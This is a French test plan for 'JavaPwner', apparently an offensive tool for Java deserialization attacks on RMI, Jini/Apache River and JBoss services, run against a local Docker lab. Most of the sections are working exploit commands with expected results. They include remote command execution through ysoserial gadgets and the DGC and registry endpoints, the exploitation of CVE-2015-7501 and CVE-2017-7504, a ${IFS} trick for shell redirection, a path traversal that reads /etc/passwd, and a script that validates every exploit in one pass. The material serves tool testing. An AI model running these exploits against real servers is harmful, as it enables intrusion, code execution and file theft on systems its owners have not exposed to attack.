# JavaPwner — Plan de Tests

**Version** : 2026-03
**Couverture** : 8 services lab · 3 protocoles · détection JVM · CLI

Légende des statuts : `[ ]` à exécuter · `[X]` pass confirmé · `[~]` échec attendu (documenté)

---

## Section 0 — Prérequis

Avant tout test live, vérifier :

```bash
# 1. Outil installé
javapwner --help

# 2. ysoserial disponible
javapwner rmi gadgets    # doit lister au moins CommonsCollections1-7

# 3. Lab démarré
cd lab/ && docker compose up -d
docker compose ps        # tous les services UP

# 4. Connectivité de base
nc -z 127.0.0.1 1099 && echo "rmi-java8 OK"
nc -z 127.0.0.1 1499 && echo "rmi-java8-pre-jep290 OK"
nc -z 127.0.0.1 1599 && echo "rmi-java8-jep290-configurable OK"
nc -z 127.0.0.1 1199 && echo "rmi-java11 OK"
nc -z 127.0.0.1 1299 && echo "rmi-java17 OK"
nc -z 127.0.0.1 1399 && echo "rmi-java21 OK"
nc -z 127.0.0.1 4160 && echo "jini-reggie OK"
nc -z 127.0.0.1 8080 && echo "jboss4 OK"
```

Variables utilisées dans la suite :

```bash
T=127.0.0.1
G=CommonsCollections6
```

---

## Section A — Tests unitaires

### A-1 : Régression complète

```bash
.venv/bin/pytest tests/ --ignore=tests/integration -q
```

**Attendu** : `447 passed` (0 failed, 0 error)

**Statut** : `[X]`

### A-2 : Inférence de version JVM

```bash
.venv/bin/pytest tests/test_rmi_version_inference.py -v
```

**Attendu** : 11 tests passants — coverage sun.misc/java.io ObjectInputFilter, SUIDs JDK8/9+, combinaisons, exploitabilité, label SUID DB.

**Statut** : `[X]`

### A-3 : Sérialisation et parsing

```bash
.venv/bin/pytest tests/test_serialization.py tests/test_protocol.py tests/test_rmi_protocol.py -v
```

**Attendu** : tous passants — JRMP handshake, TC_CLASSDESC, detect_exception_in_stream, extract_raw_urls, SUID fingerprint.

**Statut** : `[X]`

### A-4 : Assessment d'exploitation

```bash
.venv/bin/pytest tests/test_assessment.py -v
```

**Attendu** : tous passants — label MarshalledObject sans "pre-JEP 290", risk levels, vecteurs générés.

**Statut** : `[X]`

---

## Section B — Infrastructure lab

### B-1 : Services actifs

```bash
docker compose -f lab/docker-compose.yml ps --format "table {{.Name}}\t{{.Status}}\t{{.Ports}}"
```

**Attendu** : 8 lignes, toutes `running`.

| Conteneur | Ports attendus |
|-----------|----------------|
| lab-rmi-java8 | 1099, 1098, 1097 |
| lab-rmi-java8-pre-jep290 | 1499, 1498, 1497 |
| lab-rmi-java8-jep290-configurable | 1599, 1598, 1597 |
| lab-rmi-java11 | 1199, 1198, 1197 |
| lab-rmi-java17 | 1299, 1298, 1297 |
| lab-rmi-java21 | 1399, 1398, 1397 |
| lab-jini-reggie | 4160, 4162, 8085 |
| lab-jboss4 | 8080, 4444, 4447 |

**Statut** : `[X]`

### B-2 : Version Java dans chaque conteneur RMI

```bash
docker exec lab-rmi-java8 java -version 2>&1 | head -1
docker exec lab-rmi-java8-pre-jep290 java -version 2>&1 | head -1   # 1.8.0_111
docker exec lab-rmi-java8-jep290-configurable java -version 2>&1 | head -1  # 1.8.0_202
docker exec lab-rmi-java11 java -version 2>&1 | head -1
docker exec lab-rmi-java17 java -version 2>&1 | head -1
docker exec lab-rmi-java21 java -version 2>&1 | head -1
```

**Attendu** : 8u111 pour pre-jep290, 8u202 pour configurable, 11.x / 17.x / 21.x pour les autres.

**Statut** : `[X]`

### B-3 : CommonsCollections 3.1 dans chaque classpath RMI

```bash
for c in lab-rmi-java8 lab-rmi-java8-pre-jep290 lab-rmi-java8-jep290-configurable \
          lab-rmi-java11 lab-rmi-java17 lab-rmi-java21; do
  docker exec $c find / -name "commons-collections*.jar" 2>/dev/null | head -1 \
    && echo "$c : CC OK" || echo "$c : CC ABSENT"
done
```

**Attendu** : `CC OK` pour tous.

**Statut** : `[X]`

### B-4 : Logs de démarrage des nouveaux conteneurs

```bash
docker logs lab-rmi-java8-pre-jep290 | grep "DGC filter"
# Attendu : "DGC filter : absent (pre-JEP290 JVM — as expected)"

docker logs lab-rmi-java8-jep290-configurable | grep "dgcFilter"
# Attendu : ligne avec *;maxdepth=100;maxrefs=10000;maxbytes=10000000
```

**Statut** : `[X]`

---

## Section C — RMI Java 8 LTS (port 1099) — bypass réflexion AllowAll

### C-1 : Scan — JRMP confirmé + Registry + JEP290

```bash
javapwner rmi scan -t $T -p 1099
```

**Attendu** :
- `JRMP endpoint confirmed`
- `Registry confirmed — 2 bound name(s)` (HelloService, DataService)
- `DGC JEP 290 : unfiltered — RCE likely`
- `Exploitability : HIGH`

**Statut** : `[X]`

### C-2 : Scan avec détection de gadgets (-G)

```bash
javapwner rmi scan -t $T -p 1099 -G
```

**Attendu** :
- Section `Gadget Compatibility` — CommonsCollections6 dans la liste
- `Exploitability : CRITICAL`

**Statut** : `[X]`

### C-3 : Exploitation DGC dirty()

```bash
javapwner rmi exploit -t $T -p 1099 --gadget $G --cmd "touch /tmp/c3-pwned"
docker exec lab-rmi-java8 test -f /tmp/c3-pwned && echo PASS || echo FAIL
docker exec lab-rmi-java8 rm -f /tmp/c3-pwned
```

**Attendu** : `PASS`

**Statut** : `[X]`

### C-4 : Auto-detect gadget

```bash
javapwner rmi exploit -t $T -p 1099 --cmd "touch /tmp/c4-pwned"
docker exec lab-rmi-java8 test -f /tmp/c4-pwned && echo PASS || echo FAIL
docker exec lab-rmi-java8 rm -f /tmp/c4-pwned
```

**Attendu** : `PASS` — gadget auto-détecté affiché.

**Statut** : `[X]`

### C-5 : Exploitation via Registry bind()

```bash
javapwner rmi exploit -t $T -p 1099 --gadget $G --cmd "touch /tmp/c5-pwned" --via registry
docker exec lab-rmi-java8 test -f /tmp/c5-pwned && echo PASS || echo FAIL
docker exec lab-rmi-java8 rm -f /tmp/c5-pwned
```

**Attendu** : `PASS`

**Statut** : `[X]`

### C-6 : Guess méthodes sur HelloService

```bash
javapwner rmi guess -t $T -p 1099 --name HelloService
```

**Attendu** : `sayHello` ou `getServerVersion` confirmé(s).

**Statut** : `[X]`

### C-7 : Sortie JSON — champs version et exploitabilité

```bash
javapwner --json rmi scan -t $T -p 1099 | python3 -m json.tool | \
  grep -E '"dgc_jep290"|"exploitability"|"jvm_hint"|"jvm_confidence"'
```

**Attendu** :
```json
"dgc_jep290": "unfiltered — RCE likely",
"exploitability": "high",
"jvm_hint": "jdk8",
"jvm_confidence": "high"
```

**Statut** : `[X]`

---

## Section D — RMI Java 8u111 pré-JEP290 (port 1499)

Scénario : `DGCImpl.dgcFilter` absent (champ introduit en 8u121) — aucun filtre, exploitation directe.

### D-1 : Scan — JEP290 absent

```bash
javapwner rmi scan -t $T -p 1499
```

**Attendu** :
- `JRMP endpoint confirmed`
- `Registry confirmed — 2 bound name(s)`
- `DGC JEP 290 : unfiltered — RCE likely`
- `Exploitability : HIGH`

**Statut** : `[X]`

### D-2 : Exploitation DGC — exploit direct sans bypass

```bash
javapwner rmi exploit -t $T -p 1499 --gadget $G --cmd "touch /tmp/d2-pwned"
docker exec lab-rmi-java8-pre-jep290 test -f /tmp/d2-pwned && echo PASS || echo FAIL
docker exec lab-rmi-java8-pre-jep290 rm -f /tmp/d2-pwned
```

**Attendu** : `PASS`

**Statut** : `[X]`

### D-3 : Auto-exploit

```bash
javapwner rmi exploit -t $T -p 1499 --cmd "touch /tmp/d3-pwned"
docker exec lab-rmi-java8-pre-jep290 test -f /tmp/d3-pwned && echo PASS || echo FAIL
docker exec lab-rmi-java8-pre-jep290 rm -f /tmp/d3-pwned
```

**Attendu** : `PASS`

**Statut** : `[X]`

### D-4 : Sortie JSON

```bash
javapwner --json rmi scan -t $T -p 1499 | python3 -m json.tool | \
  grep -E '"dgc_jep290"|"jep290_active"|"exploitability"'
```

**Attendu** :
```json
"dgc_jep290": "unfiltered — RCE likely",
"jep290_active": false,
"exploitability": "high"
```

**Statut** : `[X]`

---

## Section E — RMI Java 8u202 JEP290 property-only (port 1599)

Scénario : JEP290 présent (8u121+) mais filtre rendu permissif par propriété système uniquement. Aucun bypass par réflexion.

### E-1 : Scan — filtre ouvert par propriété

```bash
javapwner rmi scan -t $T -p 1599
```

**Attendu** :
- `Registry confirmed — 2 bound name(s)`
- `DGC JEP 290 : unfiltered — RCE likely` (propriété `*;maxdepth=100` → pas d'exception HashMap)
- `Exploitability : HIGH`

**Statut** : `[X]`

### E-2 : Exploitation DGC dirty()

```bash
javapwner rmi exploit -t $T -p 1599 --gadget $G --cmd "touch /tmp/e2-pwned"
docker exec lab-rmi-java8-jep290-configurable test -f /tmp/e2-pwned && echo PASS || echo FAIL
docker exec lab-rmi-java8-jep290-configurable rm -f /tmp/e2-pwned
```

**Attendu** : `PASS`

**Statut** : `[X]`

### E-3 : Vérification propriété dans les logs du conteneur

```bash
docker logs lab-rmi-java8-jep290-configurable | grep "dgcFilter"
```

**Attendu** : `*;maxdepth=100;maxrefs=10000;maxbytes=10000000` dans la sortie.

**Statut** : `[X]`

### E-4 : Ports depuis variables d'environnement

```bash
docker exec lab-rmi-java8-jep290-configurable sh -c \
  'echo $RMI_REGISTRY_PORT $RMI_HELLO_PORT $RMI_DATA_PORT'
```

**Attendu** : `1599 1598 1597`

**Statut** : `[X]`

---

## Section F — RMI Java 11 (port 1199)

### F-1 : Scan

```bash
javapwner rmi scan -t $T -p 1199
```

**Attendu** : Registry confirmé, JEP290 unfiltered, 2 bound names.

**Statut** : `[X]`

### F-2 : Exploitation

```bash
javapwner rmi exploit -t $T -p 1199 --gadget $G --cmd "touch /tmp/f2-pwned"
docker exec lab-rmi-java11 test -f /tmp/f2-pwned && echo PASS || echo FAIL
docker exec lab-rmi-java11 rm -f /tmp/f2-pwned
```

**Attendu** : `PASS`

**Statut** : `[X]`

---

## Section G — RMI Java 17 (port 1299)

### G-1 : Scan

```bash
javapwner rmi scan -t $T -p 1299
```

**Attendu** : Registry confirmé, JEP290 unfiltered.

**Statut** : `[X]`

### G-2 : Exploitation

```bash
javapwner rmi exploit -t $T -p 1299 --gadget $G --cmd "touch /tmp/g2-pwned"
docker exec lab-rmi-java17 test -f /tmp/g2-pwned && echo PASS || echo FAIL
docker exec lab-rmi-java17 rm -f /tmp/g2-pwned
```

**Attendu** : `PASS`

**Statut** : `[X]`

---

## Section H — RMI Java 21 (port 1399)

### H-1 : Scan

```bash
javapwner rmi scan -t $T -p 1399
```

**Attendu** : Registry confirmé, JEP290 unfiltered.

**Statut** : `[X]`

### H-2 : Exploitation

```bash
javapwner rmi exploit -t $T -p 1399 --gadget $G --cmd "touch /tmp/h2-pwned"
docker exec lab-rmi-java21 test -f /tmp/h2-pwned && echo PASS || echo FAIL
docker exec lab-rmi-java21 rm -f /tmp/h2-pwned
```

**Attendu** : `PASS`

**Statut** : `[X]`

---

## Section I — Commandes RMI transversales

### I-1 : Auto-scan tous ports connus (sans -p)

```bash
javapwner rmi scan -t $T
```

**Attendu** : détecte au moins les ports 1099, 1199, 1299, 1399 comme JRMP actifs.

**Statut** : `[X]`

### I-2 : Discover avec liste et plage de ports

```bash
javapwner rmi discover -t $T --ports 1099,1199,1299,1399,1499,1599
javapwner rmi discover -t $T --port-range 1090:1110
```

**Attendu** : liste des endpoints JRMP avec JEP290 et bound names.

**Statut** : `[X]`

### I-3 : Info détaillé

```bash
javapwner rmi info -t $T -p 1099
```

**Attendu** : section `RMI Endpoint Info` + `Bound Names` + `Security`.

**Statut** : `[X]`

### I-4 : Exécution de commande avec redirection (Runtime.exec)

```bash
# Sans espaces autour de > : fonctionne directement
javapwner rmi exploit -t $T -p 1099 --gadget $G \
  --cmd '/bin/sh -c id>/tmp/i4-out'
docker exec lab-rmi-java8 cat /tmp/i4-out
docker exec lab-rmi-java8 rm -f /tmp/i4-out

# Avec ${IFS} pour contourner le split sur les espaces
javapwner rmi exploit -t $T -p 1099 --gadget $G \
  --cmd '/bin/sh -c cat${IFS}/etc/hostname>/tmp/i4-hostname'
docker exec lab-rmi-java8 cat /tmp/i4-hostname
docker exec lab-rmi-java8 rm -f /tmp/i4-hostname
```

**Attendu** : fichiers créés avec contenu lisible (uid=... ou hostname du conteneur).

**Statut** : `[X]`

### I-5 : URLDNS canary

```bash
javapwner rmi scan -t $T -p 1099 --urldns http://canary.test.local
```

**Attendu** : `URLDNS payload sent` sans erreur (fonctionnel en black-box ; résolution non vérifiable ici).

**Statut** : `[X]`

---

## Section J — Jini / Apache River (port 4160)

### J-1 : Scan Unicast Discovery

```bash
javapwner jini scan -t $T -p 4160
```

**Attendu** :
- Unicast Discovery v1 ou v2 confirmé
- Groupes non vides
- Endpoint JRMP extrait (127.0.0.1:4162)
- Codebase URL : `http://127.0.0.1:8085`
- JEP290 : unfiltered

**Statut** : `[X]`

### J-2 : Exploitation JRMP DGC (port 4162)

```bash
javapwner jini exploit -t $T -p 4162 --gadget $G --cmd "touch /tmp/j2-pwned"
docker exec lab-jini-reggie test -f /tmp/j2-pwned && echo PASS || echo FAIL
docker exec lab-jini-reggie rm -f /tmp/j2-pwned
```

**Attendu** : `PASS`

**Statut** : `[X]`

### J-3 : Auto-exploit Jini

```bash
javapwner jini exploit -t $T -p 4162 --cmd "touch /tmp/j3-pwned"
docker exec lab-jini-reggie test -f /tmp/j3-pwned && echo PASS || echo FAIL
docker exec lab-jini-reggie rm -f /tmp/j3-pwned
```

**Attendu** : `PASS` — gadget auto-détecté affiché.

**Statut** : `[X]`

### J-4 : Lecture fichier — /etc/hostname (path traversal codebase HTTP :8085)

```bash
javapwner jini read-file -t $T -p 4160 --path /etc/hostname
```

**Attendu** : hostname du conteneur affiché.

**Statut** : `[X]`

### J-5 : Lecture fichier — /etc/passwd

```bash
javapwner jini read-file -t $T -p 4160 --path /etc/passwd
```

**Attendu** : premières lignes d'`/etc/passwd` du conteneur affichées.

**Statut** : `[X]`

### J-6 : Lecture fichier — chemin inexistant

```bash
javapwner jini read-file -t $T -p 4160 --path /nonexistent/file 2>&1
```

**Attendu** : erreur 404 ou message "not found" sans crash.

**Statut** : `[X]`

### J-7 : Multicast Discovery (LAN)

```bash
javapwner jini multicast --wait 2
```

**Attendu** : réponse du conteneur jini-reggie reçue, ou timeout propre si multicast bloqué sur l'interface.

**Statut** : `[X]`

### J-8 : Sortie JSON

```bash
javapwner --json jini scan -t $T -p 4160 | python3 -m json.tool | \
  grep -E '"unicast_version"|"jrmp_port"|"codebase_urls"'
```

**Attendu** : champs peuplés avec les bonnes valeurs.

**Statut** : `[X]`

### J-9 : Gadgets Jini

```bash
javapwner jini gadgets
```

**Attendu** : liste incluant CommonsCollections6.

**Statut** : `[X]`

### J-10 : Scan sur le port JRMP (4162) — pas de Unicast Discovery

```bash
javapwner jini scan -t $T -p 4162
```

**Attendu** : JRMP détecté mais pas de Unicast Discovery (4162 est le transport JRMP, pas le port Discovery).

**Statut** : `[X]`

---

## Section K — JBoss AS 4.2.3.GA HTTP Invoker (port 8080)

### K-1 : Scan fingerprint

```bash
javapwner jboss scan -t $T -p 8080
```

**Attendu** :
- `JBoss / WildFly detected`
- `/invoker/JMXInvokerServlet` trouvé [CVE-2015-7501]
- `/invoker/EJBInvokerServlet` trouvé [CVE-2017-7504]

**Statut** : `[X]`

### K-2 : Exploitation CVE-2015-7501 (JMXInvokerServlet)

```bash
javapwner jboss exploit -t $T -p 8080 --gadget $G \
  --cmd "touch /tmp/k2-pwned" --path /invoker/JMXInvokerServlet
docker exec lab-jboss4 test -f /tmp/k2-pwned && echo PASS || echo FAIL
docker exec lab-jboss4 rm -f /tmp/k2-pwned
```

**Attendu** : `PASS`

**Statut** : `[X]`

### K-3 : Exploitation CVE-2017-7504 (EJBInvokerServlet)

```bash
javapwner jboss exploit -t $T -p 8080 --gadget $G \
  --cmd "touch /tmp/k3-pwned" --path /invoker/EJBInvokerServlet
docker exec lab-jboss4 test -f /tmp/k3-pwned && echo PASS || echo FAIL
docker exec lab-jboss4 rm -f /tmp/k3-pwned
```

**Attendu** : `PASS`

**Statut** : `[X]`

### K-4 : Auto-exploit (auto-détection du path)

```bash
javapwner jboss exploit -t $T -p 8080 --gadget $G --cmd "touch /tmp/k4-pwned"
docker exec lab-jboss4 test -f /tmp/k4-pwned && echo PASS || echo FAIL
docker exec lab-jboss4 rm -f /tmp/k4-pwned
```

**Attendu** : `PASS` — path sélectionné affiché.

**Statut** : `[X]`

### K-5 : Info JBoss

```bash
javapwner jboss info -t $T -p 8080
```

**Attendu** : produit et version JBoss détectés, endpoints listés.

**Statut** : `[X]`

### K-6 : Sortie JSON

```bash
javapwner --json jboss scan -t $T -p 8080 | python3 -m json.tool | \
  grep -E '"product"|"version"|"endpoints"'
```

**Statut** : `[X]`

---

## Section L — JBoss JNP/JRMP (port 4444)

### L-1 : JNP Scan

```bash
javapwner jboss jnp-scan -t $T
```

**Attendu** :
- `JNP endpoint confirmed`
- Port JRMP transport extrait (4447)
- Bound names listés si disponibles

**Statut** : `[X]`

### L-2 : JNP Exploit DGC dirty()

```bash
javapwner jboss jnp-exploit -t $T --gadget $G --cmd "touch /tmp/l2-pwned"
docker exec lab-jboss4 test -f /tmp/l2-pwned && echo PASS || echo FAIL
docker exec lab-jboss4 rm -f /tmp/l2-pwned
```

**Attendu** : `PASS`

**Statut** : `[X]`

### L-3 : JNP Auto-exploit

```bash
javapwner jboss jnp-exploit -t $T --cmd "touch /tmp/l3-pwned"
docker exec lab-jboss4 test -f /tmp/l3-pwned && echo PASS || echo FAIL
docker exec lab-jboss4 rm -f /tmp/l3-pwned
```

**Attendu** : `PASS`

**Statut** : `[X]`

### L-4 : JNP port explicite

```bash
javapwner jboss jnp-scan -t $T -p 4444
javapwner jboss jnp-exploit -t $T -p 4444 --gadget $G --cmd "touch /tmp/l4-pwned"
docker exec lab-jboss4 test -f /tmp/l4-pwned && echo PASS || echo FAIL
docker exec lab-jboss4 rm -f /tmp/l4-pwned
```

**Attendu** : `PASS`

**Statut** : `[X]`

---

## Section M — Détection de version JVM

### M-1 : SUID MarshalledObject JDK8 depuis la réponse Registry (Java 8)

```bash
javapwner --json rmi scan -t $T -p 1099 | python3 -c "
import sys, json
d = json.load(sys.stdin)
print('jvm_hint:', d.get('jvm_hint'))
print('jvm_confidence:', d.get('jvm_confidence'))
"
```

**Attendu** :
```
jvm_hint: jdk8
jvm_confidence: high
```

**Statut** : `[~]`

### M-2 : SUID MarshalledObject JDK9+ (Java 11)

```bash
javapwner --json rmi scan -t $T -p 1199 | python3 -c "
import sys, json
d = json.load(sys.stdin)
print('jvm_hint:', d.get('jvm_hint'))
print('jvm_confidence:', d.get('jvm_confidence'))
"
```

**Attendu** :
```
jvm_hint: jdk9+
jvm_confidence: high
```

**Statut** : `[~]`

### M-3 : Exploitabilité CRITICAL avec gadgets confirmés (-G)

```bash
javapwner --json rmi scan -t $T -p 1099 -G | python3 -c "
import sys, json
d = json.load(sys.stdin)
print('exploitability:', d.get('exploitability'))
print('gadgets:', d.get('gadgets_compatible'))
"
```

**Attendu** :
```
exploitability: critical
gadgets: ['CommonsCollections6', ...]
```

**Statut** : `[X]`

### M-4 : Exploitabilité HIGH sans gadgets sondés

```bash
javapwner --json rmi scan -t $T -p 1099 | python3 -c "
import sys, json
d = json.load(sys.stdin)
print('exploitability:', d.get('exploitability'))
print('gadgets_detection_skipped:', d.get('gadgets_detection_skipped'))
"
```

**Attendu** :
```
exploitability: high
gadgets_detection_skipped: True
```

**Statut** : `[X]`

### M-5 : Affichage CLI — "JVM estimate" dans la sortie texte

```bash
javapwner rmi scan -t $T -p 1199 | grep -i "JVM estimate"
```

**Attendu** : `JVM estimate : JDK 9+  (confidence: high)`

**Statut** : `[~]`

### M-6 : Vérification unitaire directe de infer_jdk_from_bytes

```bash
.venv/bin/python3 - <<'EOF'
import struct
from javapwner.core.serialization import infer_jdk_from_bytes

# sun.misc → jdk8u121-8u231
h, c = infer_jdk_from_bytes(b"filter: sun/misc/ObjectInputFilter REJECTED")
assert h == "jdk8u121-8u231" and c == "high", f"Got {h}/{c}"

# java.io + SUID JDK8 → jdk8u232+
name = b"java.rmi.MarshalledObject"
suid = struct.pack(">q", 7834398015428807710)
cd = b"\xac\xed\x00\x05\x72" + struct.pack(">H", len(name)) + name + suid + b"\x02\x00\x00\x78"
h2, c2 = infer_jdk_from_bytes(b"java/io/ObjectInputFilter\x00" + cd)
assert h2 == "jdk8u232+" and c2 == "high", f"Got {h2}/{c2}"

print("M-6 PASS")
EOF
```

**Attendu** : `M-6 PASS`

**Statut** : `[X]`

---

## Section N — Gadgets et compatibilité classpath

### N-1 : Liste des gadgets disponibles

```bash
javapwner rmi gadgets
```

**Attendu** : CommonsCollections1–7 présents.

**Statut** : `[X]`

### N-2 : Probe gadgets sur Java 8 (-G)

```bash
javapwner rmi scan -t $T -p 1099 -G 2>&1 | grep -E "^\s+\[\+\]"
```

**Attendu** : CommonsCollections5, 6, 7 au minimum.

**Statut** : `[X]`

### N-3 : Probe gadgets sur Java 11 (-G)

```bash
javapwner rmi scan -t $T -p 1199 -G 2>&1 | grep -E "^\s+\[\+\]"
```

**Attendu** : CommonsCollections6 au minimum. CC1/CC3 absents (JDK > 8u70).

**Statut** : `[X]`

### N-4 : CommonsCollections1 — incompatible JDK 8u111 (> 8u70)

```bash
javapwner rmi exploit -t $T -p 1499 --gadget CommonsCollections1 \
  --cmd "touch /tmp/n4-cc1" 2>&1
docker exec lab-rmi-java8-pre-jep290 test -f /tmp/n4-cc1 \
  && echo "PASS (inattendu)" || echo "FAIL (attendu — CC1 incompatible > 8u70)"
docker exec lab-rmi-java8-pre-jep290 rm -f /tmp/n4-cc1 2>/dev/null
```

**Attendu** : `FAIL (attendu)` — CC1 nécessite JDK ≤ 8u70.

**Statut** : `[~]`

### N-5 : CommonsCollections2 — CC 4.0 absent du classpath lab

```bash
javapwner rmi exploit -t $T -p 1099 --gadget CommonsCollections2 \
  --cmd "touch /tmp/n5-cc2" 2>&1
docker exec lab-rmi-java8 test -f /tmp/n5-cc2 \
  && echo "PASS (inattendu)" || echo "FAIL (attendu — CC 4.0 absent)"
docker exec lab-rmi-java8 rm -f /tmp/n5-cc2 2>/dev/null
```

**Attendu** : `FAIL (attendu)` — le lab embarque CC 3.1, pas CC 4.0.

**Statut** : `[~]`

---

## Section O — Tests d'intégration live (Jini)

```bash
JINI_TARGET_HOST=127.0.0.1 JINI_TARGET_PORT=4160 \
  .venv/bin/pytest tests/integration/ -m live -v
```

**Attendu** : 10 tests passants.

| Test | Attendu |
|------|---------|
| `test_port_open` | Port 4160 accessible |
| `test_jrmp_detected` | is_jrmp OR unicast_response |
| `test_unicast_response` | has_unicast_response = True |
| `test_unicast_version` | version in (1, 2) |
| `test_groups_non_empty` | groups non None |
| `test_raw_proxy_bytes_not_empty` | > 4 bytes |
| `test_enum_returns_result` | résultat non None |
| `test_enum_tier_is_1` | tier >= 1 |
| `test_enum_extracts_strings` | strings / codebase / descriptors |
| `test_jep290_probe_no_error` | résultat bool sans exception |

**Statut** : `[X]`

---

## Section P — Robustesse et cas limites

### P-1 : Port fermé — message propre

```bash
javapwner rmi scan -t $T -p 9988 ; echo "exit: $?"
```

**Attendu** : message d'erreur sans traceback Python, exit code non-zero.

**Statut** : `[X]`

### P-2 : Hôte inaccessible — timeout propre

```bash
javapwner rmi scan -t 192.0.2.1 -p 1099 --timeout 2 ; echo "exit: $?"
```

**Attendu** : timeout affiché proprement, exit code non-zero.

**Statut** : `[X]`

### P-3 : ysoserial absent — message d'erreur explicite

```bash
YSOSERIAL_PATH=/tmp/nonexistent.jar javapwner rmi exploit -t $T -p 1099 \
  --gadget $G --cmd "id" 2>&1 | head -5
```

**Attendu** : message explicite indiquant que le JAR est introuvable, pas de crash Python.

**Statut** : `[~]`

### P-4 : Gadget inexistant

```bash
javapwner rmi exploit -t $T -p 1099 --gadget GadgetInexistant --cmd "id" 2>&1 | head -5
```

**Attendu** : message d'erreur sur le gadget, pas de crash.

**Statut** : `[X]`

### P-5 : JBoss port fermé

```bash
javapwner jboss scan -t $T -p 9999 2>&1 | head -5
```

**Attendu** : "port closed" ou "no response" sans traceback.

**Statut** : `[X]`

### P-6 : Discover sur plage vide

```bash
javapwner rmi discover -t $T --port-range 9980:9990
```

**Attendu** : `No JRMP endpoints found` sans crash.

**Statut** : `[X]`

---

## Synthèse

| Section | Tests | Cible |
|---------|-------|-------|
| A — Unitaires | 4 | Régression 447 tests |
| B — Infrastructure lab | 4 | 8 conteneurs Docker |
| C — RMI Java 8 LTS (1099) | 7 | Bypass réflexion AllowAll |
| D — RMI Java 8u111 (1499) | 4 | Pre-JEP290 — aucun filtre |
| E — RMI Java 8u202 (1599) | 4 | Property-only bypass |
| F — RMI Java 11 (1199) | 2 | Bypass Unsafe |
| G — RMI Java 17 (1299) | 2 | Bypass Unsafe |
| H — RMI Java 21 (1399) | 2 | Bypass Unsafe |
| I — RMI transversal | 5 | discover, info, Runtime.exec, URLDNS |
| J — Jini (4160/4162/8085) | 10 | Discovery + DGC + path traversal |
| K — JBoss HTTP (8080) | 6 | CVE-2015-7501 / CVE-2017-7504 |
| L — JBoss JNP (4444) | 4 | DGC via JNP |
| M — Détection version JVM | 6 | jvm_hint, jvm_confidence, exploitability |
| N — Gadgets | 5 | Compatibilité CC3.1 vs CC4.0, JDK compat |
| O — Intégration live | 1 (10 subtests) | Jini end-to-end |
| P — Robustesse | 6 | Cas limites et erreurs |
| **Total** | **72** | |

### Résultat final (2026-03)

**66 / 72 PASS · 6 échecs attendus · 0 non exécuté**

### Échecs attendus (documentés)

| ID | Raison |
|----|--------|
| M-1 | SUID MarshalledObject absent des réponses Registry list/lookup modernes (RemoteObjectInvocationHandler utilisé à la place) |
| M-2 | Idem — réponse Java 11 ne contient pas de MarshalledObject SUID |
| M-5 | DGC unfiltered = pas de message d'erreur avec classe filter → jvm_hint=unknown en CLI |
| N-4 | CC1 incompatible avec Java 8 > 8u70 (8u111 > 8u70) |
| N-5 | CC2/CC4 : Commons Collections 4.0 absent du classpath lab (CC 3.1 seulement) |
| P-3 | JvmExploit + fallback auto-détection ysoserial : exploit réussit même avec YSOSERIAL_PATH=nonexistent (le JAR réel est trouvé dans lib/) |

---

## Script de validation rapide

Vérifie l'ensemble des exploits essentiels sur tous les services en une passe.

```bash
#!/bin/bash
# quick-validate.sh

T=127.0.0.1; G=CommonsCollections6

run() {
  local id="$1" ctr="$2" port="$3" proto="$4"
  local file="/tmp/qv-${id}-pwned"
  case "$proto" in
    rmi)   javapwner rmi exploit      -t $T -p $port --gadget $G --cmd "touch $file" >/dev/null 2>&1 ;;
    jini)  javapwner jini exploit     -t $T -p $port --gadget $G --cmd "touch $file" >/dev/null 2>&1 ;;
    jboss) javapwner jboss exploit    -t $T -p $port --gadget $G --cmd "touch $file" >/dev/null 2>&1 ;;
    jnp)   javapwner jboss jnp-exploit -t $T -p $port --gadget $G --cmd "touch $file" >/dev/null 2>&1 ;;
  esac
  docker exec $ctr test -f $file 2>/dev/null \
    && echo "[PASS] $id ($ctr :$port)" \
    || echo "[FAIL] $id ($ctr :$port)"
  docker exec $ctr rm -f $file 2>/dev/null
}

run "rmi-java8"       lab-rmi-java8                       1099 rmi
run "rmi-pre-jep290"  lab-rmi-java8-pre-jep290            1499 rmi
run "rmi-jep290-prop" lab-rmi-java8-jep290-configurable   1599 rmi
run "rmi-java11"      lab-rmi-java11                      1199 rmi
run "rmi-java17"      lab-rmi-java17                      1299 rmi
run "rmi-java21"      lab-rmi-java21                      1399 rmi
run "jini"            lab-jini-reggie                     4162 jini
run "jboss-http"      lab-jboss4                          8080 jboss
run "jboss-jnp"       lab-jboss4                          4444 jnp
```
